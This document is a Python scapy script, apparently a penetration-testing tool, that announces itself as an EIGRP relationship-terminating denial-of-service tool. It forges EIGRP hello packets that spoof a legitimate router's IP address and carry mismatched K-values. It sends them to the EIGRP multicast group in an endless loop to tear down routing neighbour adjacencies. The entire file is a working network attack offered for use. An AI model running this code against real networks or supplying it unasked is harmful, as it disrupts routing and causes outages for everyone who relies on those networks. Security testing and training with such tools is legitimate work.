#!/usr/bin/python3


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse

print (r"""
███████╗██╗░██████╗░██████╗░██████╗░░██╗░░░░░░░██╗███╗░░██╗
██╔════╝██║██╔════╝░██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
█████╗░░██║██║░░██╗░██████╔╝██████╔╝░╚██╗████╗██╔╝██╔██╗██║
██╔══╝░░██║██║░░╚██╗██╔══██╗██╔═══╝░░░████╔═████║░██║╚████║
███████╗██║╚██████╔╝██║░░██║██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║
╚══════╝╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝
    """)

print ("EIGRP Relationships terminating tool (Denial of Service)")
print("\nAuthor: @necreas1ng, <necreas1ng@protonmail.com>\n")



L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--asn", type=int, dest="asn", required=True, help="Specify the EIGRP AS Number")
    parser.add_argument("--src", type=str, dest="src", required=True, help="Specify the legitimate router ip address")
    
    args = parser.parse_args()

    return args


args = get_arguments()


def spray(interface, asn, src):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=args.src, dst=EIGRPMulticast)
    eigrp = EIGRP(asn=args.asn, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255), EIGRPSwVer()])
    crafted = frame/ip/eigrp
    print ('[+] The beginning of reset EIGRP neighborships...')
    sendp(crafted, iface=args.interface, loop=1, inter=3, verbose=1)

spray(args.interface, args.asn, args.src)
